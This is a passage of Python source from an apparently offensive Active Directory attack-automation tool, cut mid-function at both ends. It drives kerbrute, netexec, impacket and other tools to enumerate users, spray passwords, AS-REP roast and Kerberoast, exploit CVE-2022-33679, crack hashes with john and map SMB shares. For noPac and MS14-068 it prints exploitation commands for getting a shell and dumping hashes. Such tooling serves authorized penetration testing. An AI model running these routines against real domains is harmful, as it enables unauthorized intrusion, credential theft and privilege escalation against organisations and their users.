        print(f"{PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}")
    print("")

def kerbrute_enum():
    if nullsess_bool:
        if not kerbrute:
            print(f"{RED}[-] Please verify the location of kerbrute{NC}")
            return # changed to return, as there's no point to continue
        print(f"{BLUE}[*] kerbrute User Enumeration (Null session)${NC}")
        print(f"{YELLOW}[i] Using {user_wordlist} wordlist for user enumeration. This may take a while...{NC}")
        run_command(f"{kerbrute} userenum {user_wordlist} -d {dc_domain} --dc {dc_ip} -t 5 {argument_kerbrute}")

        # Parse valid users from output
        with open(f"{output_dir}/BruteForce/kerbrute_user_output_{dc_domain}.txt", 'r') as infile:
          with open(f"{output_dir}/DomainRecon/Users/users_list_kerbrute_{dc_domain}.txt", 'w') as outfile:
            for line in infile:
                if "VALID" in line:
                    username = line.split(" ")[7].split("@")[0]
                    outfile.write(username+"\n")

        if os.path.getsize(f"{output_dir}/DomainRecon/Users/users_list_kerbrute_{dc_domain}.txt") > 0:
            print(f"{GREEN}[+] Printing valid accounts...{NC}")
            with open(f"{output_dir}/DomainRecon/Users/users_list_kerbrute_{dc_domain}.txt", 'r') as f:
              print(f.read())
            parse_users()
    else:
        print(f"{PURPLE}[-] Kerbrute null session enumeration skipped (credentials provided){NC}")
    print("")

def userpass_ne_check():
    target_userslist = users_list
    if not os.path.getsize(users_list) > 0:
        userslist_ans = "N"
        print(f"{PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?{NC}")
        userslist_ans = input(">> ")
        if userslist_ans.upper() == "Y":
            target_userslist = user_wordlist

    print(f"{BLUE}[*] netexec User=Pass Check (Noisy!){NC}")
    print(f"{YELLOW}[i] Finding users with Password = username using netexec. This may take a while...{NC}")
    run_command(f"{netexec} {ne_verbose} smb {target} -u {target_userslist} -p {target_userslist} --no-bruteforce --continue-on-success")
     # Parse valid users from output
    with open(f"{output_dir}/BruteForce/ne_userpass_output_{dc_domain}.txt", 'r') as infile, open(f"{output_dir}/BruteForce/user_eq_pass_valid_ne_{dc_domain}.txt", 'w') as outfile:
      for line in infile:
        if "[+]" in line:
          username = line.split("\\")[1].split(" ")[0]
          outfile.write(username+"\n")

    if os.path.getsize(f"{output_dir}/BruteForce/user_eq_pass_valid_ne_{dc_domain}.txt") > 0:
      print(f"{GREEN}[+] Printing accounts with username=password...{NC}")
      with open(f"{output_dir}/BruteForce/user_eq_pass_valid_ne_{dc_domain}.txt", 'r') as f:
        print(f.read())

    else:
        print(f"{PURPLE}[-] No accounts with username=password found${NC}")
    print("")

def userpass_kerbrute_check():
    if not kerbrute:
        print(f"{RED}[-] Please verify the location of kerbrute{NC}")
        return

    target_userslist = users_list
    user_pass_wordlist = os.path.join(output_dir, "BruteForce", f"kerbrute_userpass_wordlist_{dc_domain}.txt")
    print(f"{BLUE}[*] kerbrute User=Pass Check (Noisy!){NC}")

    if not os.path.getsize(users_list) > 0:
        userslist_ans = "N"
        print(f"{PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?{NC}")
        userslist_ans = input(">> ")
        if userslist_ans.upper() == "Y":
            target_userslist = user_wordlist

    print(f"{YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...{NC}")

    # Create a wordlist with username:username format
    with open(target_userslist, 'r') as infile, open(user_pass_wordlist, 'w') as outfile:
        for line in infile:
            username = line.strip()
            outfile.write(f"{username}:{username}\n")
    
    # sort -u 
    subprocess.run(['sort', '-u', '-o', user_pass_wordlist, user_pass_wordlist], check=True)

    run_command(f"{kerbrute} bruteforce {user_pass_wordlist} -d {dc_domain} --dc {dc_ip} -t 5 {argument_kerbrute}")

    # Parse valid users from output
    with open(f"{output_dir}/BruteForce/kerbrute_pass_output_{dc_domain}.txt", 'r') as infile, open(f"{output_dir}/BruteForce/user_eq_pass_valid_kerb_{dc_domain}.txt", 'w') as outfile:
       for line in infile:
          if "VALID" in line:
            username = line.split(" ")[7].split("@")[0]
            outfile.write(username+"\n") 
        
    if  os.path.getsize(f"{output_dir}/BruteForce/user_eq_pass_valid_kerb_{dc_domain}.txt") > 0:
        print(f"{GREEN}[+] Printing accounts with username=password...{NC}")
        with open(f"{output_dir}/BruteForce/user_eq_pass_valid_kerb_{dc_domain}.txt", 'r') as f:
          print(f.read())
    else:
        print(f"{PURPLE}[-] No accounts with username=password found{NC}")
    print("")

def ne_passpray():
    target_userslist = users_list
    if not os.path.getsize(users_list) > 0:
        userslist_ans = "N"
        print(f"{PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?{NC}")
        userslist_ans = input(">> ")
        if userslist_ans.upper() == "Y":
            target_userslist = user_wordlist

    print(f"{BLUE}[*] Password spray using netexec (Noisy!){NC}")
    print(f"{BLUE}[*] Please specify password for password spray:{NC}")
    passpray_password = input(">> ")
    while not passpray_password:
        print(f"{RED}Invalid password.{NC} Please specify password:")
        passpray_password = input(">> ")

    print(f"{YELLOW}[i] Password spraying with password {passpray_password}. This may take a while...{NC}")
    run_command(f"{netexec} {ne_verbose} ldap {target_dc} -u {target_userslist} -p {passpray_password} --no-bruteforce --continue-on-success")

    # Parse valid users from output
    with open(f"{output_dir}/BruteForce/ne_passpray_output_{dc_domain}.txt", 'r') as infile, open(f"{output_dir}/BruteForce/passpray_valid_ne_{dc_domain}.txt", 'w') as outfile:
      for line in infile:
          if "[+]" in line:
            username = line.split("\\")[1].split(" ")[0]
            outfile.write(username+"\n")
    
    if  os.path.getsize(f"{output_dir}/BruteForce/passpray_valid_ne_{dc_domain}.txt") > 0:
        print(f"{GREEN}[+] Printing accounts with password {passpray_password}...{NC}")
        with open(f"{output_dir}/BruteForce/passpray_valid_ne_{dc_domain}.txt", 'r') as f:
            print(f.read())       
    else:
        print(f"{PURPLE}[-] No accounts with password {passpray_password} found{NC}")
    print("")

def kerbrute_passpray():
    if not kerbrute:
        print(f"{RED}[-] Please verify the location of kerbrute{NC}")
        return

    target_userslist = users_list
    if not os.path.getsize(users_list) > 0:
        userslist_ans = "N"
        print(f"{PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?{NC}")
        userslist_ans = input(">> ")
        if userslist_ans.upper() == "Y":
            target_userslist = user_wordlist

    print(f"{BLUE}[*] Password spray using kerbrute (Noisy!){NC}")
    print(f"{BLUE}[*] Please specify password for password spray:{NC}")
    passpray_password = input(">> ")
    while not passpray_password:
        print(f"{RED}Invalid password.{NC} Please specify password:")
        passpray_password = input(">> ")

    print(f"{YELLOW}[i] Password spraying with password {passpray_password}. This may take a while...{NC}")
    run_command(f"{kerbrute} passwordspray {target_userslist} {passpray_password} -d {dc_domain} --dc {dc_ip} -t 5 {argument_kerbrute}")

    # Parse valid users from output
    with open(f"{output_dir}/BruteForce/kerbrute_passpray_output_{dc_domain}.txt", 'r') as infile, open(f"{output_dir}/BruteForce/passpray_valid_kerb_{dc_domain}.txt", 'w') as outfile:
       for line in infile:
        if "VALID" in line:
            username = line.split(" ")[7].split("@")[0]
            outfile.write(username+"\n")
            
    if  os.path.getsize(f"{output_dir}/BruteForce/passpray_valid_kerb_{dc_domain}.txt") > 0:
        print(f"{GREEN}[+] Printing accounts with password {passpray_password}...{NC}")
        with open(f"{output_dir}/BruteForce/passpray_valid_kerb_{dc_domain}.txt", 'r') as f:
            print(f.read()) 
    else:
        print(f"{PURPLE}[-] No accounts with password {passpray_password} found{NC}")
    print("")

def ne_pre2k():
    print(f"{BLUE}[*] Pre2k Enumeration using netexec{NC}")
    run_command(f"echo -n Y | {netexec} {ne_verbose} ldap {target_dc} {argument_ne} -M pre2k")
    print("")

def pre2k_check():
    if not pre2k:
        print(f"{RED}[-] Please verify the installation of pre2k{NC}")
        return

    print(f"{BLUE}[*] Pre2k authentication check (Noisy!){NC}")
    pre2k_outputfile = os.path.join(output_dir, "BruteForce", f"pre2k_outputfile_{dc_domain}.txt")
    if nullsess_bool:
        if not os.path.getsize(servers_hostname_list) > 0:
            print(f"{PURPLE}[-] No computers found! Please re-run computers enumeration and try again..{NC}")
            return # changed to return, as there's no point to continue
        run_command(f"{pre2k} unauth {argument_pre2k} -dc-ip {dc_ip} -inputfile {servers_hostname_list} -outputfile {pre2k_outputfile}")
    else:
        ldaps_param = "-binding" if ldapbinding_bool else ""
        ldaps_param += " -ldaps" if ldaps_bool else ""
        run_command(f"{pre2k} auth {argument_pre2k} -dc-ip {dc_ip} -outputfile {pre2k_outputfile} {ldaps_param}")
    print("")

def ldapnomnom_enum():
    if nullsess_bool:
        if not ldapnomnom:
            print(f"{RED}[-] Please verify the location of ldapnomnom{NC}")
            return
        print(f"{BLUE}[*] ldapnomnom User Enumeration (Null session)${NC}")
        print(f"{YELLOW}[i] Using {user_wordlist} wordlist for user enumeration. This may take a while...{NC}")
        ldaps_param = "--tlsmode tls --port 636" if ldaps_bool else ""
        output_file = f"{output_dir}/DomainRecon/Users/users_list_ldapnomnom_{dc_domain}.txt"
        run_command(f"{ldapnomnom} --server {dc_ip} --dnsdomain {dc_domain} {ldaps_param} --maxservers 4 --parallel 8 --input {user_wordlist} --output {output_file}")

        if os.path.getsize(output_file) > 0:
            print("")
            print(f"{GREEN}[+] Printing valid accounts...{NC}")
            with open(output_file, "r") as f:
                unique_users = sorted(set(f.read().splitlines()))
                for user in unique_users:
                    print(user)
            parse_users()
    else:
        print(f"{PURPLE}[-] ldapnomnom null session enumeration skipped (credentials provided)${NC}")
    print("")

def ne_timeroast():
    print(f"{BLUE}[*] Timeroast attack (NTP){NC}")
    run_command(f"{netexec} {ne_verbose} smb {target} {argument_ne} -M timeroast")
    print("")

###### kerberos: Kerberos attacks
def asrep_attack():
    if not impacket_GetNPUsers:
        print(f"{RED}[-] GetNPUsers.py not found! Please verify the installation of impacket{NC}")
        return

    print(f"{BLUE}[*] AS REP Roasting Attack{NC}")

    if dc_domain.lower() != domain.lower() or nullsess_bool:
        users_scan_list = users_list if os.path.getsize(users_list) > 0 else user_wordlist
        if users_scan_list == user_wordlist:
            print(f"{YELLOW}[i] No credentials for target domain provided. Using {user_wordlist} wordlist...{NC}")
        print(f"{CYAN}[i] Running command: {impacket_GetNPUsers} {dc_domain}/ -usersfile {users_scan_list} -request -dc-ip {dc_ip} -dc-host {dc_NETBIOS}{NC}")
        run_command(f"{impacket_GetNPUsers} {dc_domain}/ -usersfile {users_scan_list} -request -dc-ip {dc_ip} -dc-host {dc_NETBIOS}")
    else:
        print(f"{CYAN}[i] Running command: {impacket_GetNPUsers} {argument_imp} -dc-ip {dc_ip} -dc-host {dc_NETBIOS}{NC}")
        run_command(impacket_GetNPUsers + " " + argument_imp + f" -dc-ip {dc_ip} -dc-host {dc_NETBIOS}")
        print(f"{CYAN}[i] Running command: {impacket_GetNPUsers} {argument_imp} -request -dc-ip {dc_ip} -dc-host {dc_NETBIOS}{NC}")
        run_command(impacket_GetNPUsers + " " + argument_imp + f" -request -dc-ip {dc_ip} -dc-host {dc_NETBIOS}")
        

    # Process output for errors and hashes
    asreproast_output_file = f"{output_dir}/Kerberos/asreproast_output_{dc_domain}.txt"
    if os.path.exists(asreproast_output_file):
      with open(asreproast_output_file, "r") as f:
          output = f.read()

      if "error" in output:
          print(f"{RED}[-] Errors during AS REP Roasting Attack... {NC}")
          return

      hashes = []
      for line in output.splitlines():
          if "krb5asrep" in line:
              hashes.append(line.split("$krb5asrep$23$")[1])

      if hashes:
          hash_output_file = f"{output_dir}/Kerberos/asreproast_hashes_{dc_domain}.txt"
          with open(hash_output_file, "w") as f:
              for h in hashes:
                  f.write(h + "\n")
          hash_count = len(hashes)
          print(f"{GREEN}[+] ASREP-roastable accounts found!{NC}")
          print(f"{GREEN}[+] Found {hash_count} hashes. Saved to {hash_output_file}{NC}")
      else:
          print(f"{PURPLE}[-] No ASREP-roastable accounts found{NC}")
    print("")

def asreprc4_attack():
    if not CVE202233679:
        print(f"{RED}[-] Please verify the location of CVE-2022-33679.py{NC}")
        return

    if nullsess_bool:
        print(f"{BLUE}[*] CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)${NC}")
        asreproast_hashes_file = f"{output_dir}/Kerberos/asreproast_hashes_{dc_domain}.txt"
        if not os.path.exists(asreproast_hashes_file):
            print(f"{YELLOW}[i] ASREPRoast hashes not found. Initiating ASREP attack...{NC}")
            asrep_attack()  # Run ASREP attack to potentially find users

        if os.path.exists(asreproast_hashes_file):
          with open(asreproast_hashes_file, "r") as f:
            for line in f:
                asrep_user = line.split("@")[0] #Try to get the user
                break  # Exit after the first user

        if asrep_user:
            print(f"{GREEN}[+] ASREProastable user found: {asrep_user}{NC}")
            current_dir = os.getcwd()
            os.chdir(os.path.join(output_dir, "Credentials"))
            print(f"{YELLOW}[i] Running command: {python3} {CVE202233679} {dc_domain}/{asrep_user} {dc_domain} -dc-ip {dc_ip} {argument_CVE202233679}{NC}")
            cve_output = run_command(f"{python3} {CVE202233679} {dc_domain}/{asrep_user} {dc_domain} -dc-ip {dc_ip} {argument_CVE202233679}")
            os.chdir(current_dir)

            cve_output_file = f"{output_dir}/Kerberos/CVE-2022-33679_output_{dc_domain}.txt"
            with open(cve_output_file, "w") as f:
                f.write(cve_output)

            if os.path.getsize(cve_output_file) > 0:
                print(f"{GREEN}[+] Exploit output saved to: {cve_output_file}{NC}")
                hash_count = cve_output.count("krb5asrep")
                print(f"{GREEN}[+] Found {hash_count} hashes.{NC}")
                with open(f"{output_dir}/Kerberos/CVE-2022-33679_hashes_{dc_domain}.txt", "w") as hashfile:
                    for line in cve_output.splitlines():
                      if "$krb5asrep$23$" in line:
                        hashfile.write(line.split("$krb5asrep$23$")[1]+"\n")

                print(f"{GREEN}[+] Hashes saved to: {output_dir}/Kerberos/CVE-2022-33679_hashes_{dc_domain}.txt{NC}")
            else:
                print(f"{RED}[-] No hashes found in the exploit output.{NC}")
        else:
            print(f"{PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}")
    else:
        print(f"{PURPLE}[-] CVE-2022-33679 skipped (credentials provided)${NC}")
    print("")

def kerberoast_attack():
    if not impacket_GetUserSPNs:
        print(f"{RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket{NC}")
        return

    if dc_domain.lower() != domain.lower() or nullsess_bool:
        print(f"{BLUE}[*] Blind Kerberoasting Attack{NC}")
        asreproast_hashes_file = f"{output_dir}/Kerberos/asreproast_hashes_{dc_domain}.txt"
        asrep_user = ""
        if os.path.exists(asreproast_hashes_file):
            with open(asreproast_hashes_file, 'r') as f:
                first_line = f.readline().strip()
                if first_line:  # Check if the line is not empty
                    asrep_user = first_line.split('@')[0]

        if asrep_user:
            print(f"{YELLOW}[i] Running command: {impacket_GetUserSPNs} -no-preauth {asrep_user} -usersfile {users_list} -dc-ip {dc_ip} -dc-host {dc_NETBIOS} {dc_domain}{NC}")
            run_command(f"{impacket_GetUserSPNs} -no-preauth {asrep_user} -usersfile {users_list} -dc-ip {dc_ip} -dc-host {dc_NETBIOS} {dc_domain}")

            # Process output for errors and hashes
            kerberoast_output_file = f"{output_dir}/Kerberos/kerberoast_blind_output_{dc_domain}.txt"
            if os.path.exists(kerberoast_output_file):
               with open(kerberoast_output_file, "r") as f:
                  output = f.read()
               if "error" in output:
                   print(f"{RED}[-] Errors during Blind Kerberoast Attack... {NC}")
                   return #changed to return, as there's no point to continue
               print(f"{GREEN}[+] Blind Kerberoast Attack completed successfully. Extracting hashes...{NC}")
               # Extract and format hashes
               hashes = []
               for line in output.splitlines():
                  if "krb5tgs" in line:
                    #This is a fix of the original regex that's suppose to replace krb5tgs with :krb5tgs
                    parts = line.split('$krb5tgs$')
                    if len(parts) > 1:
                      hashes.append('$' + '$'.join(parts[1:]))
               
               if hashes:
                  hash_output_file = f"{output_dir}/Kerberos/kerberoast_hashes_{dc_domain}.txt"
                  with open(hash_output_file, "w") as f:
                    for h in hashes:
                        f.write(h + "\n")
                  hash_count = len(hashes)
                  print(f"{GREEN}[+] Found {hash_count} Kerberoast hashes.{NC}")
                  with open(hash_output_file, 'r') as f:
                    print(f.read()) # Show the content
               else:
                print("No hashes extracted")
            else:
                print("Error: kerberoast_blind_output file not found")

        else:
            print(f"{PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}")
    else:
        print(f"{BLUE}[*] Kerberoast Attack{NC}")
        print(f"{YELLOW}[i] Running command: {impacket_GetUserSPNs} {argument_imp} -dc-ip {dc_ip} -dc-host {dc_NETBIOS} -target-domain {dc_domain}{NC}")
        run_command(f"{impacket_GetUserSPNs} {argument_imp} -dc-ip {dc_ip} -dc-host {dc_NETBIOS} -target-domain {dc_domain}")
        print(f"{YELLOW}[i] Running command: {impacket_GetUserSPNs} {argument_imp} -request -dc-ip {dc_ip} -dc-host {dc_NETBIOS} -target-domain {dc_domain}{NC}")
        run_command(f"{impacket_GetUserSPNs} {argument_imp} -request -dc-ip {dc_ip} -dc-host {dc_NETBIOS} -target-domain {dc_domain}")

        # Process output for errors and hashes
        kerberoast_output_file = f"{output_dir}/Kerberos/kerberoast_output_{dc_domain}.txt"
        if os.path.exists(kerberoast_output_file):
            with open(kerberoast_output_file, "r") as f:
                output = f.read()

            if "error" in output:
                print(f"{RED}[-] Errors during Kerberoast Attack... {NC}")
                return

            print(f"{GREEN}[+] Kerberoast Attack completed successfully. Extracting hashes...{NC}")
            # Extract and format hashes
            hashes = []
            for line in output.splitlines():
                if "krb5tgs" in line:
                    parts = line.split('$krb5tgs$')
                    if len(parts) > 1:
                      hashes.append('$' + '$'.join(parts[1:]))

            if hashes:
                hash_output_file = f"{output_dir}/Kerberos/kerberoast_hashes_{dc_domain}.txt"
                with open(hash_output_file, "w") as f:
                    for h in hashes:
                        f.write(h + "\n")
                hash_count = len(hashes)
                print(f"{GREEN}[+] Found {hash_count} Kerberoast hashes.{NC}")
                with open(hash_output_file, "r") as f:
                    print(f.read())  # Display the extracted hashes

                # Extract MSSQL SPNs
                with open(f"{output_dir}/Kerberos/kerberoast_list_output_{dc_domain}.txt", "r") as list_file:
                    with open(f"{output_dir}/DomainRecon/Servers/sql_list_kerberoast_{dc_domain}.txt", "w") as sql_file:
                        for line in list_file:
                            if "MSSQLSvc" in line:
                                try:
                                    hostname = line.split("/")[1].split(":")[0].split(" ")[0]  # Extract hostname
                                    sql_file.write(hostname + "\n")
                                except IndexError:
                                    pass #Ignore error
            else:
                print("No hashes extracted.")
        else:
            print("Error: kerberoast_output file not found.")
    print("")

def krbjack_attack():
    if not krbjack:
        print(f"{RED}[-] Please verify the location of krbjack{NC}")
        return

    print(f"{BLUE}[*] Checking for DNS unsecure updates using krbjack{NC}")
    run_command(f"{krbjack} check --dc-ip {dc_ip} --domain {domain}")

    # Process output to check for vulnerability and provide exploitation steps
    krbjack_output_file = f"{output_dir}/Kerberos/krbjack_output_{dc_domain}.txt"
    if os.path.exists(krbjack_output_file):
        with open(krbjack_output_file, "r") as f:
            output = f.read()

        if "This domain IS NOT vulnerable" not in output:
            print(f"{GREEN}[+] DNS unsecure updates possible! Follow steps below to abuse the vuln and perform AP_REQ hijacking:{NC}")
            print(f"{krbjack} run --dc-ip {dc_ip} --target-ip {dc_ip} --domain {domain} --target-name {dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>")
        else:
            print("Domain is not vulnerable to krbjack.")
    else:
        print("Error: krbjack_output file not found.")
    print("")

def kerborpheus_attack():
    if not orpheus:
        print(f"{RED}[-] orpheus.py not found! Please verify the installation of orpheus{NC}")
        return

    if nullsess_bool:
        print(f"{PURPLE}[-] orpheus requires credentials{NC}")
        return

    print(f"{BLUE}[*] Kerberoast Attack using Orpheus{NC}")
    current_dir = os.getcwd()
    
    # Ensure the necessary directory exists
    orpheus_dir = os.path.join(scripts_dir, "orpheus-main")
    if not os.path.exists(orpheus_dir):
        print(f"{RED}[-] Orpheus directory not found: {orpheus_dir}{NC}")
        return
    
    os.chdir(orpheus_dir)
    print(f"{YELLOW}[i] Changing directory to {orpheus_dir}{NC}")
    print(f"{YELLOW}[i] Running command: {python3} {orpheus}{NC}")

    # Construct the initial commands for orpheus in an interactive-like way
    initial_commands = f"cred {argument_imp}\ndcip {dc_ip}\nfile {output_dir}/Kerberos/orpheus_kerberoast_hashes_{dc_domain}.txt\n enc 18\n hex 0x40AC0010"
    
    command = f"""(
        echo -e "{initial_commands}"
        cat /dev/tty
    ) | /usr/bin/script -qc "{python3} {orpheus}" /dev/null"""
    run_command(command)
    os.chdir(current_dir)
    print(f"{YELLOW}[i] Returning to directory {current_dir}{NC}")

    # Check and extract hashes from the output file
    orpheus_output_file = f"{output_dir}/Kerberos/orpheus_output_{dc_domain}.txt"
    if os.path.exists(orpheus_output_file):
          with open(orpheus_output_file, "r") as f:
            output = f.read()
            if "krb5tgs" in output:
                print(f"{GREEN}[+] Hashes found during Orpheus Kerberoast Attack. Extracting hashes...{NC}")
                hashes = []
                for line in output.splitlines():
                    if "krb5tgs" in line:
                        parts = line.split('$krb5tgs$')
                        if len(parts) > 1:
                            hashes.append('$' + '$'.join(parts[1:]))
                if hashes:
                  hash_output_file = f"{output_dir}/Kerberos/orpheus_kerberoast_hashes_{dc_domain}.txt"
                  with open(hash_output_file, 'w') as f:
                      for h in hashes:
                          f.write(h + "\n")
                  hash_count = len(hashes)
                  print(f"{GREEN}[+] Found {hash_count} Kerberoast hashes. Saved to {hash_output_file}{NC}")
                  with open(hash_output_file, 'r') as f:
                    print(f.read()) # Show the content
                else:
                    print(f"{RED}[-] No hashes found during Orpheus Kerberoast Attack.${NC}")
            else:
              print(f"{RED}[-] No hashes found during Orpheus Kerberoast Attack.${NC}")
    else:
        print("Error: orpheus_output file not found")
    print("")

def nopac_check():
    print(f"{BLUE}[*] NoPac (CVE-2021-42278 and CVE-2021-42287) check {NC}")
    if kerb_bool:
        print(f"{PURPLE}[-] netexec's nopac does not support kerberos authentication{NC}")
        return  # Skip if Kerberos auth is used

    run_command(f"{netexec} {ne_verbose} smb {target_dc} {argument_ne} -M nopac")
    with open(f"{output_dir}/Kerberos/ne_nopac_output_{dc_domain}.txt", 'r') as f:
        output = f.read()
        if "VULNERABLE" in output:
            print(f"{GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:{NC}")
            # You can't directly write to a file opened in read mode.  If you
            # want to log additional steps, either reopen in append mode, or
            # build the string and write it out at the end.
            exploit_steps = [
                f"{CYAN}# Get shell:{NC}",
                f"noPac.py {argument_imp} -dc-ip $dc_ip -dc-host {dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]",
                f"{CYAN}# Dump hashes:{NC}",
                f"noPac.py {argument_imp} -dc-ip $dc_ip -dc-host {dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]",
            ]
            with open(f"{output_dir}/Kerberos/noPac_exploitation_steps_{dc_domain}.txt", "a") as exploit_file:
                for step in exploit_steps:
                    exploit_file.write(step + "\n")
                    print(step)
    print("")

def ms14_068_check():
    print(f"{BLUE}[*] MS14-068 check {NC}")
    if not impacket_goldenPac:
        print(f"{RED}[-] goldenPac.py not found! Please verify the installation of impacket{NC}")
        return

    if nullsess_bool or kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] MS14-068 requires credentials and does not support Kerberos authentication{NC}")
        return

    run_command(f"{impacket_goldenPac} {argument_imp_gp}\\{dc_FQDN} None -target-ip {dc_ip}")
    with open(f"{output_dir}/Kerberos/ms14-068_output_{dc_domain}.txt", 'r') as f:
      output = f.read()
      if "found vulnerable" in output:
          print(f"{GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!{NC}")
          exploit_steps = [
                f"{CYAN}# Execute command below to get shell:{NC}",
                f"{impacket_goldenPac} {argument_imp}@{dc_FQDN} -target-ip {dc_ip}",
            ]
          with open(f"{output_dir}/Kerberos/ms14-068_exploitation_steps_{dc_domain}.txt", "a") as exploit_file:
              for step in exploit_steps:
                  exploit_file.write(step + "\n")
                  print(step) #Print at the console too
    print("")

def raise_child():
    if not impacket_raiseChild:
        print(f"{RED}[-] raiseChild.py not found! Please verify the installation of impacket {NC}")
        return
    if nullsess_bool:
        print(f"{PURPLE}[-] raiseChild requires credentials{NC}")
        return

    print(f"{BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild{NC}")
    run_command(f"{impacket_raiseChild} {argument_imp} -w {output_dir}/Credentials/raiseChild_ccache_{dc_domain}.txt")
    print("")

def john_crack_asrep():
    if not john:
        print(f"{RED}[-] Please verify the installation of john{NC}")
        return # changed to return, as there's no point to continue

    print(f"{BLUE}[*] Cracking found hashes using john the ripper{NC}")
    asreproast_hashes_file = f"{output_dir}/Kerberos/asreproast_hashes_{dc_domain}.txt"
    if not os.path.exists(asreproast_hashes_file) or not os.path.getsize(asreproast_hashes_file) > 0:
        print(f"{PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}")
        return  # No point continuing

    print(f"{YELLOW}[i] Using {pass_wordlist} wordlist...${NC}")
    print(f"{CYAN}[*] Launching john on collected asreproast hashes. This may take a while...{NC}")
    print(f"{YELLOW}[i] Press CTRL-C to abort john...${NC}")
    run_command(f"{john} {asreproast_hashes_file} --format=krb5asrep --wordlist={pass_wordlist}")
    print(f"{GREEN}[+] Printing cracked AS REP Roast hashes...${NC}")
    run_command(f"{john} {asreproast_hashes_file} --format=krb5asrep --show")
    print("")

def john_crack_kerberoast():
    if not john:
        print(f"{RED}[-] Please verify the installation of john{NC}")
        return  # Exit if john is not installed

    print(f"{BLUE}[*] Cracking found hashes using john the ripper{NC}")

    # Check for Kerberoast hash files
    kerberoast_hashes = f"{output_dir}/Kerberos/kerberoast_hashes_{dc_domain}.txt"
    targeted_hashes = f"{output_dir}/Kerberos/targetedkerberoast_hashes_{dc_domain}.txt"
    
    if (not os.path.exists(kerberoast_hashes) or os.path.getsize(kerberoast_hashes) == 0) and \
       (not os.path.exists(targeted_hashes) or os.path.getsize(targeted_hashes) == 0):
        print(f"{PURPLE}[-] No SPN accounts found${NC}")
        return  # No hashes to crack
    # Concatenate all *kerberoast_hashes*.txt file
    hash_files = []
    if os.path.exists(kerberoast_hashes):
      hash_files.append(kerberoast_hashes)
    if os.path.exists(targeted_hashes):
      hash_files.append(targeted_hashes)
      
    print(f"{GREEN}[+] Hashes location: {', '.join(hash_files)}{NC}")
    print(f"{YELLOW}[i] Using {pass_wordlist} wordlist...${NC}")
    print(f"{CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...{NC}")
    print(f"{YELLOW}[i] Press CTRL-C to abort john...${NC}")
    
    # Use cat to combine and john to crack
    run_command(f"cat {' '.join(hash_files)} | {john} --format=krb5tgs --wordlist={pass_wordlist} --stdin")
    
    # Show cracked passwords using subprocess.run for capturing output
    john_result = subprocess.run([john, '--format=krb5tgs', '--show'], input='\n'.join(open(f, 'r').read() for f in hash_files), capture_output=True, text=True, check=False)
    if john_result.returncode == 0 and john_result.stdout:
        print(f"{GREEN}[+] Printing cracked Kerberoast hashes...${NC}")
        print(john_result.stdout)
        with open(f"{output_dir}/Kerberos/kerberoast_john_results_{dc_domain}.txt", "w") as result_file:
            result_file.write(john_result.stdout) # Log the results
    else:
        print("No Kerberoast hashes cracked.")
    print("")

###### scan_shares: Shares scan
def smb_map():
    if not smbmap:
        print(f"{RED}[-] Please verify the installation of smbmap{NC}")
        return # changed to return, as there's no point to continue

    os.makedirs(os.path.join(output_dir, "Shares", "smbmapDump"), exist_ok=True)
    print(f"{BLUE}[*] SMB shares Scan using smbmap{NC}")

    if kerb_bool or aeskey_bool:
        print(f"{PURPLE}[-] smbmap does not support Kerberos authentication{NC}")
        return # changed to return, as there's no point to continue

    servers_smb_list_content = smb_scan()
    
    print(f"{BLUE}[*] Listing accessible SMB shares - Step 1/2{NC}")
    for i in open(servers_smb_list_content):
        i = i.strip() #Remove any space
        print(f"{CYAN}[*] Listing shares on {i} {NC}")
        run_command(f"{smbmap} -H {i} {argument_smbmap}")

        if nullsess_bool:
            print(f"{CYAN}[*] smbmap enumeration (Guest and random user){NC}")
            run_command(f"{smbmap} -H {i} -u 'Guest' -p ''")
            run_command(f"{smbmap} -H {i} -u {rand_user} p ''")
            
    # Create and write to CSV and TXT files
    shares_csv = os.path.join(output_dir, "Shares", f"all_network_shares_{dc_domain}.csv")
    shares_txt = os.path.join(output_dir, "Shares", f"all_network_shares_{dc_domain}.txt")
    share_files = subprocess.getoutput(f"find {output_dir}/Shares/smbmapDump/ -name 'smb_shares_{dc_domain}_*.txt' -print")
    with open(shares_csv, 'w') as csvfile, open(shares_txt, 'w') as txtfile:
        for file in share_files.splitlines():
          with open(file, 'r') as infile:
            for line in infile:
               if ("READ" in line) and ("prnproc$" not in line) and ("IPC$" not in line) and ("print$" not in line) and ("SYSVOL" not in line) and ("NETLOGON" not in line):
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        server_share = parts[0].split("/")[-1] #Get server name
                        share = parts[1]
                        permission = parts[2].replace("READ,", "READ-").replace("READONLY", "READ-ONLY").replace("WRITE","WRITE")
                        csvfile.write(f"{server_share};{share};{permission}\n")
                        txtfile.write(f"\\\\{server_share}\\{share}\n")

    print(f"{BLUE}[*] Listing files in accessible shares - Step 2/2{NC}")
    for i in  open(servers_smb_list_content):
      i = i.strip()
      print(f"{CYAN}[*] Listing files in accessible shares on {i} {NC}")
      current_dir = os.getcwd()
      os.makedirs(os.path.join(output_dir, "Shares", "smbmapDump", i), exist_ok=True)
      os.chdir(os.path.join(output_dir, "Shares", "smbmapDump", i))
      
      # Run the smbmap command with file extensions and exclusions
      exclude_shares = "'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'"
